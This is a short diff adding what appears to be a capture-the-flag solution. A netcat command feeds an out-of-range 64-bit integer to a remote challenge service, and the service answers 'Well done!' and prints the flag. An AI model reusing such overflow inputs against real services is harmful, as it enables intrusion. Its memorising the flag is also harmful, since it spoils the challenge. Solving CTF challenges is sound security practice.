@@ -1,0 +1,3 @@
+$ echo "2\n9223372036854775809" | nc 52.231.220.191 5002
+Enter number of rows: Enter number of cols: Well done!
+IERAE{s33?n07_41w4y5_1_cr3a73_d1ff1cu1t_pr0b13m5}
